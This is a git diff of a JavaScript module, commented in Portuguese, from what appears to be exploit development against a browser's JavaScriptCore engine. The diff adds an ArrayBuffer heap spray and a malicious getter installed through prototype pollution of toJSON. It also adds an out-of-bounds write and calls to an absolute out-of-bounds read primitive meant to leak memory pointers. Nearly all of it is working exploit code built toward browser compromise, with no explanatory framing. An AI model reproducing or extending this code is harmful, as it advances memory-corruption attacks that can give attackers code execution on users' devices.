@@ -5,37 +5,65 @@ import {
     triggerOOB_primitive,
     oob_array_buffer_real,
     oob_write_absolute,
-    oob_read_absolute, // Precisaremos se pudermos obter um endereço
+    oob_read_absolute, // Agora vamos tentar usar!
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Para JSC_OFFSETS
+import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
 const GADGET_PROPERTY_NAME = "AAAA_GetterRepro";
 export let getter_repro_called_flag = false;
 export let getter_repro_this_id_logged = null;
-export let getter_repro_this_marker_original = null;
-export let getter_repro_this_marker_modified = null;
-// Para armazenar dados lidos especulativamente de 'this'
-export let getter_speculative_reads = {};
+// ... (outras flags globais de exportação podem ser mantidas ou removidas se não usadas diretamente no log final)
+export let getter_leak_attempt_results = {};
+
 
 class MyComplexObject {
     constructor(id) {
-        this.id = `MyObj-${id}`; // String
-        this.value1 = 12345;     // Number (potential inline property)
-        this.value2 = "initial_state"; // String
-        this.marker = 0xCAFECAFE; // Number (potential inline property)
-        this.anotherProperty = "clean_prop";
-        this.propA = "valA";
-        this.propB = 23456;
-        this.propC = null;
-        this.propD = { nested: "valD" }; // Object
-        this.propE = [1,2,3];            // Array
-        // Adicionar uma propriedade que poderia ser usada para vazar se 'this' fosse um ArrayBuffer
-        this.potential_leak_slot = 0x41424344; // ABCD
+        this.id = `MyObj-${id}`;
+        this.value1 = 12345;
+        this.value2 = "initial_state";
+        this.marker = 0xCAFECAFE;
+        this.propD = { original_nested_prop: "valD_orig" }; // Alvo para potencial corrupção para ponteiro
+        this.propE = [100, 200, 300];                       // Alvo para potencial corrupção para ponteiro
+        this.potential_leak_slot = 0x41424344;
     }
 }
 
-export function toJSON_TriggerGetterViaForIn() {
+// Spray de ArrayBuffers para serem alvos de um possível vazamento de ponteiro
+const AB_SPRAY_COUNT = 100;
+const AB_SPRAY_SIZE = 32;
+const AB_SPRAY_PATTERN_DWORD = 0xABCDABCD;
+let sprayed_abs = [];
+
+function sprayArrayBuffers() {
+    logS3(`Pulverizando ${AB_SPRAY_COUNT} ArrayBuffers de ${AB_SPRAY_SIZE} bytes...`, "info", "sprayArrayBuffers");
+    sprayed_abs = [];
+    for (let i = 0; i < AB_SPRAY_COUNT; i++) {
+        try {
+            const ab = new ArrayBuffer(AB_SPRAY_SIZE);
+            const dv = new DataView(ab);
+            for (let j = 0; j < AB_SPRAY_SIZE; j += 4) {
+                dv.setUint32(j, AB_SPRAY_PATTERN_DWORD, true);
+            }
+            // Adicionar uma propriedade para tentar identificar depois, se possível
+            ab.spray_id = `SprayedAB-${i}`;
+            sprayed_abs.push(ab);
+        } catch (e) {
+            logS3(`Erro ao pulverizar ArrayBuffer ${i}: ${e.message}`, "warn", "sprayArrayBuffers");
+            break;
+        }
+    }
+    logS3(`${sprayed_abs.length} ArrayBuffers pulverizados.`, "info", "sprayArrayBuffers");
+}
+
+function cleanupSprayedArrayBuffers() {
+    logS3(`Limpando ${sprayed_abs.length} ArrayBuffers pulverizados...`, "info", "cleanupSprayedArrayBuffers");
+    sprayed_abs = []; // Permitir GC
+    globalThis.gc?.();
+}
+
+
+export function toJSON_TriggerGetterViaForIn() { // Mesma função toJSON
     const FNAME_toJSON = "toJSON_TriggerGetterViaForIn";
     let returned_payload = {
         _variant_: FNAME_toJSON,
@@ -47,9 +75,10 @@ export function toJSON_TriggerGetterViaForIn() {
             for (const prop in this) {
                 iteration_count++;
                 if (Object.prototype.hasOwnProperty.call(this, prop) || MyComplexObject.prototype.hasOwnProperty(prop)) {
-                    if (typeof this[prop] !== 'function' || prop === GADGET_PROPERTY_NAME) {
-                        returned_payload[prop] = this[prop];
-                    }
+                     // A lógica aqui é crucial: JSON.stringify vai tentar ler o valor de 'prop'
+                     // do objeto 'this' para colocar em 'returned_payload'.
+                     // Se 'prop' for o nosso getter, ele é executado.
+                    returned_payload[prop] = this[prop];
                 }
                 if (iteration_count > 100) {
                     logS3(`[${FNAME_toJSON}] Loop excedeu 100 iterações. ID: ${this.id}`, "warn", FNAME_toJSON);
@@ -71,15 +100,12 @@ export function toJSON_TriggerGetterViaForIn() {
 }
 
 export async function executeGetterTriggerReproTest() {
-    const FNAME_TEST = "executeGetterTriggerReproTest";
-    logS3(`--- Iniciando Teste: Getter Expandido para Sondar 'this' ---`, "test", FNAME_TEST);
-    document.title = `Repro MyComplex Getter - Probe 'this'`;
+    const FNAME_TEST = "executeGetterTriggerReproTest_SprayAB";
+    logS3(`--- Iniciando Teste: Getter com Spray de AB e Tentativa de Leitura de Ponteiro ---`, "test", FNAME_TEST);
+    document.title = `Repro MyComplex Getter - Leak Attempt`;
 
     getter_repro_called_flag = false;
-    getter_repro_this_id_logged = null;
-    getter_repro_this_marker_original = null;
-    getter_repro_this_marker_modified = null;
-    getter_speculative_reads = {}; // Resetar
+    getter_leak_attempt_results = { success: false, details: "Not called" };
 
     let originalGetterDescriptor = Object.getOwnPropertyDescriptor(MyComplexObject.prototype, GADGET_PROPERTY_NAME);
     let getterPollutionApplied = false;
@@ -88,125 +114,106 @@ export async function executeGetterTriggerReproTest() {
         logS3(`Definindo getter '${GADGET_PROPERTY_NAME}' em MyComplexObject.prototype...`, 'info', FNAME_TEST);
         Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, {
             get: function() { // ESTE É O GETTER
-                const GETTER_FNAME = "MyComplexObject_EvilGetter_Expanded";
+                const GETTER_FNAME = "MyComplexObject_EvilGetter_LeakAttempt";
                 getter_repro_called_flag = true;
-                getter_repro_this_id_logged = this.id;
-                const current_reads = { id: this.id };
+                getter_repro_this_id_logged = this.id; // Para log externo
+                const results = { id: this.id, getter_called_successfully: true, propD_type: typeof this.propD, propE_type: typeof this.propE };
 
-                logS3(`!!!! GETTER EXPANDIDO '${GADGET_PROPERTY_NAME}' FOI CHAMADO !!!! this.id: ${this.id}`, "vuln", GETTER_FNAME);
+                logS3(`!!!! GETTER LEAK ATTEMPT '${GADGET_PROPERTY_NAME}' FOI CHAMADO !!!! this.id: ${this.id}`, "vuln", GETTER_FNAME);
+                logS3(`   [${GETTER_FNAME}] Verificando 'this' (ID: ${this.id}): instanceof MyComplexObject: ${this instanceof MyComplexObject}, toString: ${Object.prototype.toString.call(this)}`, "info", GETTER_FNAME);
 
                 try {
-                    logS3(`   [${GETTER_FNAME}] Verificando 'this' (ID: ${this.id}):`, "info", GETTER_FNAME);
-                    logS3(`     instanceof MyComplexObject: ${this instanceof MyComplexObject}`, "info", GETTER_FNAME);
-                    current_reads.instanceof_MyComplexObject = this instanceof MyComplexObject;
-                    logS3(`     Object.prototype.toString.call(this): ${Object.prototype.toString.call(this)}`, "info", GETTER_FNAME);
-                    current_reads.toString_call_this = Object.prototype.toString.call(this);
+                    this.marker = 0x1EEA7BAD; // Indicar que o getter foi chamado
+                    results.marker_set_to = toHex(this.marker);
 
-                    getter_repro_this_marker_original = this.marker;
-                    this.marker = 0xAC717EDD; // Modificar propriedade conhecida
-                    getter_repro_this_marker_modified = this.marker;
-                    logS3(`     'this.marker' modificado de ${toHex(getter_repro_this_marker_original)} para ${toHex(getter_repro_this_marker_modified)}`, "info", GETTER_FNAME);
-                    current_reads.marker_original = toHex(getter_repro_this_marker_original);
-                    current_reads.marker_modified = toHex(getter_repro_this_marker_modified);
-
-                    // Tentativas especulativas de tratar 'this' como se fosse um ArrayBuffer/DataView
-                    logS3(`   [${GETTER_FNAME}] Tentando acessar 'this' como ArrayBuffer/DataView (ID: ${this.id}):`, "info", GETTER_FNAME);
-                    try {
-                        logS3(`     this.byteLength: ${this.byteLength}`, "info", GETTER_FNAME);
-                        current_reads.byteLength_prop = this.byteLength;
-                    } catch (e_bl) {
-                        logS3(`     ERRO ao ler this.byteLength: ${e_bl.message}`, "warn", GETTER_FNAME);
-                        current_reads.byteLength_prop_error = e_bl.message;
-                    }
-                    try {
-                        logS3(`     this.buffer: ${this.buffer}`, "info", GETTER_FNAME);
-                        current_reads.buffer_prop = String(this.buffer); // Pode ser um objeto
-                    } catch (e_b) {
-                        logS3(`     ERRO ao ler this.buffer: ${e_b.message}`, "warn", GETTER_FNAME);
-                        current_reads.buffer_prop_error = e_b.message;
-                    }
-
-                    // Tentar ler bytes brutos de 'this' usando métodos de DataView
-                    // Esses offsets são especulativos, baseados em como um objeto JSCell pode ser.
-                    // O JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET é o mais interessante.
-                    const speculative_offsets_to_read = {
-                        struct_ptr_offset: JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET || 0x8, // Onde esperamos o Structure*
-                        butterfly_ptr_offset: JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET || 0x10,  // Onde esperamos o Butterfly*
-                        inline_prop_val1_approx: 0x10, // Se value1 (number) estivesse inline após um cabeçalho de 16 bytes
-                        inline_prop_marker_approx: 0x18, // Se marker (number) estivesse inline após value1
-                    };
-
-                    for (const key in speculative_offsets_to_read) {
-                        const offset = speculative_offsets_to_read[key];
+                    // Inspecionar this.propD e this.propE
+                    logS3(`   [${GETTER_FNAME}] Inspecionando this.propD: ${String(this.propD)} (typeof: ${typeof this.propD})`, "info", GETTER_FNAME);
+                    results.propD_value_str = String(this.propD);
+                    if (typeof this.propD === 'number' || isAdvancedInt64Object(this.propD)) {
+                        const potential_ptr_d = isAdvancedInt64Object(this.propD) ? this.propD : new AdvancedInt64(this.propD);
+                        logS3(`     this.propD é numérico/AdvancedInt64: ${potential_ptr_d.toString(true)}. Tentando ler com oob_read_absolute...`, "leak", GETTER_FNAME);
                         try {
-                            // Tenta chamar getUint32/getBigUint64 como se 'this' fosse um DataView
-                            // Isso é altamente especulativo e provavelmente causará TypeError
-                            const val32 = this.getUint32(offset, true); // true for little-endian
-                            logS3(`     SPECULATIVE READ from 'this' at offset ${toHex(offset)} (as Uint32LE): ${toHex(val32)}`, "leak", GETTER_FNAME);
-                            current_reads[`read_offset_${toHex(offset)}_u32`] = toHex(val32);
-
-                            // Tentar ler como 64-bit também (se getBigUint64 existisse diretamente, senão simular)
-                            // Para simplificar, vamos nos ater a getUint32 por enquanto, a menos que você tenha getBigUint64
-                            // Se o ponteiro da estrutura estiver em offset e tiver 8 bytes:
-                            // const val64_low = this.getUint32(offset, true);
-                            // const val64_high = this.getUint32(offset + 4, true);
-                            // logS3(`     SPECULATIVE READ from 'this' at offset ${toHex(offset)} (as Uint64LE): ${toHex(val64_high)}${toHex(val64_low).substring(2)}`, "leak", GETTER_FNAME);
-                            // current_reads[`read_offset_${toHex(offset)}_u64`] = `${toHex(val64_high)}${toHex(val64_low).substring(2)}`;
-
-                        } catch (e_dv) {
-                            logS3(`     ERRO ao tentar this.getUint32(${toHex(offset)}): ${e_dv.name} - ${e_dv.message}`, "warn", GETTER_FNAME);
-                            current_reads[`read_offset_${toHex(offset)}_u32_error`] = e_dv.message;
+                            const leaked_val_d = oob_read_absolute(potential_ptr_d, 8); // Ler 8 bytes
+                            if (isAdvancedInt64Object(leaked_val_d)) {
+                                logS3(`       LEAK VIA PROP_D: oob_read_absolute(${potential_ptr_d.toString(true)}) retornou ${leaked_val_d.toString(true)}`, "critical", GETTER_FNAME);
+                                results.propD_leaked_qword = leaked_val_d.toString(true);
+                                results.success = true; // Marcamos sucesso se conseguirmos ler algo
+                            } else {
+                                logS3(`       LEAK VIA PROP_D: oob_read_absolute(${potential_ptr_d.toString(true)}) retornou ${toHex(leaked_val_d)} (não é AdvInt64)`, "warn", GETTER_FNAME);
+                                results.propD_leaked_raw = toHex(leaked_val_d);
+                            }
+                        } catch (e_read_d) {
+                            logS3(`       ERRO ao usar oob_read_absolute em this.propD: ${e_read_d.message}`, "error", GETTER_FNAME);
+                            results.propD_read_error = e_read_d.message;
                         }
                     }
 
-                    // Tenta acessar uma propriedade que poderia ter sido sobrescrita por um ponteiro
-                    // se a corrupção de '0x70' tivesse um efeito muito específico
-                    try {
-                        logS3(`     this.potential_leak_slot: ${toHex(this.potential_leak_slot)}`, "info", GETTER_FNAME);
-                        current_reads.potential_leak_slot_val = toHex(this.potential_leak_slot);
-                    } catch(e_pls) {
-                         logS3(`     ERRO ao ler this.potential_leak_slot: ${e_pls.message}`, "warn", GETTER_FNAME);
-                         current_reads.potential_leak_slot_error = e_pls.message;
+                    logS3(`   [${GETTER_FNAME}] Inspecionando this.propE: ${String(this.propE)} (typeof: ${typeof this.propE}, isArray: ${Array.isArray(this.propE)})`, "info", GETTER_FNAME);
+                    results.propE_value_str = String(this.propE);
+                     if (typeof this.propE === 'number' || isAdvancedInt64Object(this.propE)) {
+                        const potential_ptr_e = isAdvancedInt64Object(this.propE) ? this.propE : new AdvancedInt64(this.propE);
+                        logS3(`     this.propE é numérico/AdvancedInt64: ${potential_ptr_e.toString(true)}. Tentando ler com oob_read_absolute...`, "leak", GETTER_FNAME);
+                        try {
+                            const leaked_val_e = oob_read_absolute(potential_ptr_e, 8); // Ler 8 bytes
+                             if (isAdvancedInt64Object(leaked_val_e)) {
+                                logS3(`       LEAK VIA PROP_E: oob_read_absolute(${potential_ptr_e.toString(true)}) retornou ${leaked_val_e.toString(true)}`, "critical", GETTER_FNAME);
+                                results.propE_leaked_qword = leaked_val_e.toString(true);
+                                results.success = true; // Marcamos sucesso
+                            } else {
+                                logS3(`       LEAK VIA PROP_E: oob_read_absolute(${potential_ptr_e.toString(true)}) retornou ${toHex(leaked_val_e)} (não é AdvInt64)`, "warn", GETTER_FNAME);
+                                results.propE_leaked_raw = toHex(leaked_val_e);
+                            }
+                        } catch (e_read_e) {
+                            logS3(`       ERRO ao usar oob_read_absolute em this.propE: ${e_read_e.message}`, "error", GETTER_FNAME);
+                            results.propE_read_error = e_read_e.message;
+                        }
                     }
 
 
                 } catch (e_getter_main) {
                     logS3(`   [${GETTER_FNAME}] ERRO GERAL DENTRO DO GETTER (ID: ${this.id}): ${e_getter_main.name} - ${e_getter_main.message}`, "error", GETTER_FNAME);
-                    current_reads.getter_internal_error = e_getter_main.message;
+                    results.getter_internal_error = e_getter_main.message;
                 }
-                getter_speculative_reads = current_reads; // Armazena a última leitura
-                return "value_returned_by_expanded_getter";
+                getter_leak_attempt_results = results; // Armazena os resultados da última chamada
+                return "value_from_leak_attempt_getter";
             },
             configurable: true,
             enumerable: true
         });
         getterPollutionApplied = true;
-        logS3("Getter expandido definido com sucesso.", "good", FNAME_TEST);
+        logS3("Getter (Leak Attempt) definido com sucesso.", "good", FNAME_TEST);
 
     } catch (e_getter_setup) {
-        logS3(`ERRO ao definir getter expandido: ${e_getter_setup.message}`, "error", FNAME_TEST);
-        return { errorOccurred: e_getter_setup };
+        logS3(`ERRO ao definir getter (Leak Attempt): ${e_getter_setup.message}`, "error", FNAME_TEST);
+        return { errorOccurred: e_getter_setup, results: getter_leak_attempt_results };
     }
 
-    const spray_count = 50;
-    const sprayed_objects = [];
+    // --- Spray de Objetos e Configuração OOB ---
+    sprayArrayBuffers(); // Pulverizar ABs antes dos MyComplexObjects
+    await PAUSE_S3(SHORT_PAUSE_S3);
+
+
+    const spray_count_mycomplex = 50;
+    const sprayed_mycomplex_objects = [];
     const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;
     const value_to_write_in_oob_ab = 0xFFFFFFFF;
     const bytes_to_write_oob_val = 4;
 
-    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
+    logS3(`1. Pulverizando ${spray_count_mycomplex} instâncias de MyComplexObject...`, "info", FNAME_TEST);
     try {
-        for (let i = 0; i < spray_count; i++) {
-            sprayed_objects.push(new MyComplexObject(i));
+        for (let i = 0; i < spray_count_mycomplex; i++) {
+            sprayed_mycomplex_objects.push(new MyComplexObject(i));
         }
-        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
-    } catch (e_spray) {
-        logS3(`Spray error: ${e_spray.message}`, "error", FNAME_TEST);
+        logS3(`   Pulverização de ${sprayed_mycomplex_objects.length} MyComplexObjects concluída.`, "good", FNAME_TEST);
+    } catch (e_spray_mc) {
+        logS3(`Spray MyComplexObject error: ${e_spray_mc.message}`, "error", FNAME_TEST);
+        // Cleanup
         if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
             if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
             else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
         }
-        return { errorOccurred: e_spray };
+        cleanupSprayedArrayBuffers();
+        return { errorOccurred: e_spray_mc, results: getter_leak_attempt_results };
     }
 
     await PAUSE_S3(MEDIUM_PAUSE_S3);
@@ -214,11 +221,13 @@ export async function executeGetterTriggerReproTest() {
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
         logS3("OOB setup error", "error", FNAME_TEST);
-         if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
+        // Cleanup
+        if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
              if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
              else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
         }
-        return { errorOccurred: new Error("OOB Setup Failed") };
+        cleanupSprayedArrayBuffers();
+        return { errorOccurred: new Error("OOB Setup Failed"), results: getter_leak_attempt_results };
     }
 
     try {
@@ -227,21 +236,23 @@ export async function executeGetterTriggerReproTest() {
     } catch (e_write) {
         logS3(`OOB write error: ${e_write.message}`, "error", FNAME_TEST);
         clearOOBEnvironment();
+        // Cleanup
         if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
             if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
             else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
         }
-        return { errorOccurred: e_write };
+        cleanupSprayedArrayBuffers();
+        return { errorOccurred: e_write, results: getter_leak_attempt_results };
     }
 
     await PAUSE_S3(MEDIUM_PAUSE_S3);
-    logS3(`3. Sondando objetos pulverizados com ${toJSON_TriggerGetterViaForIn.name}...`, "test", FNAME_TEST);
+    logS3(`3. Sondando MyComplexObjects pulverizados com ${toJSON_TriggerGetterViaForIn.name}...`, "test", FNAME_TEST);
 
     const ppKey_val = 'toJSON';
     let originalToJSONProtoDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
     let toJSONPollutionApplied = false;
     let problem_detected_summary = null;
-    let first_successful_getter_reads = null;
+    let final_results_from_getter = null; // Para armazenar os resultados do getter se ele for chamado
 
     try {
         Object.defineProperty(Object.prototype, ppKey_val, {
@@ -250,22 +261,22 @@ export async function executeGetterTriggerReproTest() {
         });
         toJSONPollutionApplied = true;
 
-        const objectsToProbe = Math.min(sprayed_objects.length, 10);
-        logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);
+        const objectsToProbe = Math.min(sprayed_mycomplex_objects.length, 10);
+        logS3(`   Sondando os primeiros ${objectsToProbe} MyComplexObjects...`, 'info', FNAME_TEST);
         for (let i = 0; i < objectsToProbe; i++) {
-            const obj = sprayed_objects[i];
+            const obj = sprayed_mycomplex_objects[i];
             if (!obj) continue;
 
             getter_repro_called_flag = false; // Reset para este objeto
-            getter_speculative_reads = {}; // Reset para este objeto
+            getter_leak_attempt_results = { success: false, details: "Not called or no leak" }; // Reset
 
             const original_marker_before_stringify = obj.marker;
 
-            document.title = `Sondando MyComplexObject ${i} (Probe This)`;
+            document.title = `Sondando MyComplexObject ${i} (Leak Attempt)`;
             let stringifyResult = null;
             let errorDuringStringify = null;
 
-            logS3(`   Testando objeto ${i} (ID: ${obj.id}). Marker Original: ${toHex(original_marker_before_stringify)}`, 'info', FNAME_TEST);
+            logS3(`   Testando MyComplexObject ${i} (ID: ${obj.id}). Marker Original: ${toHex(original_marker_before_stringify)}`, 'info', FNAME_TEST);
             try {
                 stringifyResult = JSON.stringify(obj);
                 logS3(`     JSON.stringify(obj[${i}]) completou. Retorno da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
@@ -279,27 +290,26 @@ export async function executeGetterTriggerReproTest() {
             }
 
             if (getter_repro_called_flag) {
-                logS3(`   !!!! SUCESSO: Getter EXPANDIDO FOI CHAMADO para obj.id=${getter_repro_this_id_logged} (original index ${i})!!!!`, "vuln", FNAME_TEST);
-                logS3(`        Leituras Especulativas do Getter: ${JSON.stringify(getter_speculative_reads)}`, "leak", FNAME_TEST);
-                first_successful_getter_reads = getter_speculative_reads; // Salva as leituras do primeiro sucesso
+                logS3(`   !!!! SUCESSO (Parcial): Getter LEAK ATTEMPT FOI CHAMADO para obj.id=${getter_repro_this_id_logged} (original index ${i})!!!!`, "vuln", FNAME_TEST);
+                final_results_from_getter = getter_leak_attempt_results; // Salva os resultados detalhados
 
-                logS3(`        Objeto original (ID ${obj.id}) marker APÓS stringify: ${toHex(obj.marker)}`, "info", FNAME_TEST);
-                if (obj.marker === 0xAC717EDD) {
-                    logS3(`        CONFIRMADO: Objeto sprayed_objects[${i}] (ID: ${obj.id}) teve seu 'marker' modificado pelo getter e a modificação persistiu!`, "critical", FNAME_TEST);
-                    document.title = `SUCCESS: Getter Expanded Called & Prop Modified on ${obj.id}!`;
+                if (final_results_from_getter.success) {
+                    logS3(`        POTENCIAL LEAK DETECTADO DENTRO DO GETTER! Detalhes: ${JSON.stringify(final_results_from_getter)}`, "critical", FNAME_TEST);
+                    document.title = `LEAK? Getter Called on ${obj.id}!`;
                 } else {
-                    logS3(`        AVISO: Modificação do getter não persistiu ou foi sobrescrita. Original: ${toHex(original_marker_before_stringify)}, Getter setou para: ${toHex(getter_repro_this_marker_modified)}, Final: ${toHex(obj.marker)}`, "warn", FNAME_TEST);
+                     logS3(`        Getter chamado, mas sem vazamento óbvio via oob_read_absolute. Detalhes: ${JSON.stringify(final_results_from_getter)}`, "warn", FNAME_TEST);
                 }
-                problem_detected_summary = "Getter Expandido Acionado";
+                logS3(`        Objeto original (ID ${obj.id}) marker APÓS stringify: ${toHex(obj.marker)} (esperado ${toHex(0x1EEA7BAD)})`, "info", FNAME_TEST);
+                if (obj.marker === 0x1EEA7BAD) {
+                    logS3(`        CONFIRMADO: MyComplexObject[${i}] (ID: ${obj.id}) teve seu 'marker' modificado pelo getter.`, "good", FNAME_TEST);
+                }
+                problem_detected_summary = final_results_from_getter.success ? "Getter Acionado COM LEAK ESPECULATIVO" : "Getter Acionado SEM LEAK ÓBVIO";
                 break;
             }
             if (errorDuringStringify) {
                 logS3(`   ERRO durante sondagem de obj[${i}]: ${errorDuringStringify.name} ${errorDuringStringify.message ? `- ${errorDuringStringify.message}`:''}`, "error", FNAME_TEST);
                 problem_detected_summary = `Erro: ${errorDuringStringify.name}`;
                 document.title = `ERROR ${errorDuringStringify.name} on ${obj.id}`;
-                if (errorDuringStringify.name === 'RangeError') {
-                    logS3("       RangeError ocorreu.", "warn", FNAME_TEST);
-                }
                 break;
             }
             await PAUSE_S3(SHORT_PAUSE_S3);
@@ -315,25 +325,23 @@ export async function executeGetterTriggerReproTest() {
     }
 
     if (getter_repro_called_flag) {
-        logS3("Teste CONCLUÍDO: O Getter EXPANDIDO FOI ACIONADO!", "vuln", FNAME_TEST);
-        if(first_successful_getter_reads) {
-            logS3(`PRIMEIRAS LEITURAS DO GETTER BEM SUCEDIDO: ${JSON.stringify(first_successful_getter_reads, null, 2)}`, "critical", FNAME_TEST);
-        }
+        logS3(`Teste CONCLUÍDO: O Getter LEAK ATTEMPT FOI ACIONADO! Resultado da tentativa de leak:`, "vuln", FNAME_TEST);
+        logS3(JSON.stringify(final_results_from_getter, null, 2), "leak", FNAME_TEST); // Log formatado
     } else if (problem_detected_summary) {
-        logS3(`Teste CONCLUÍDO: Um problema (${problem_detected_summary}) ocorreu durante a sondagem.`, "warn", FNAME_TEST);
+        logS3(`Teste CONCLUÍDO: Um problema (${problem_detected_summary}) ocorreu.`, "warn", FNAME_TEST);
     } else {
-        logS3("Teste CONCLUÍDO: Getter expandido não acionado e nenhum erro óbvio.", "good", FNAME_TEST);
+        logS3("Teste CONCLUÍDO: Getter (Leak Attempt) não acionado.", "good", FNAME_TEST);
     }
 
+    // Cleanup
     if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
         if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
         else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
         logS3(`Getter '${GADGET_PROPERTY_NAME}' restaurado/removido de MyComplexObject.prototype.`, "info", FNAME_TEST);
     }
-
-    logS3(`--- Teste Getter Expandido para Sondar 'this' CONCLUÍDO ---`, "test", FNAME_TEST);
+    cleanupSprayedArrayBuffers();
+    logS3(`--- Teste Getter com Spray de AB e Tentativa de Leitura de Ponteiro CONCLUÍDO ---`, "test", FNAME_TEST);
     clearOOBEnvironment();
-    sprayed_objects.length = 0;
-    globalThis.gc?.();
-    document.title = getter_repro_called_flag ? document.title : (problem_detected_summary ? document.title : `Repro Probe 'this' Done`);
+    sprayed_mycomplex_objects.length = 0;
+    document.title = problem_detected_summary || (getter_repro_called_flag ? "Getter Leak Done" : "Getter Leak Attempt Done (No Call)");
 }
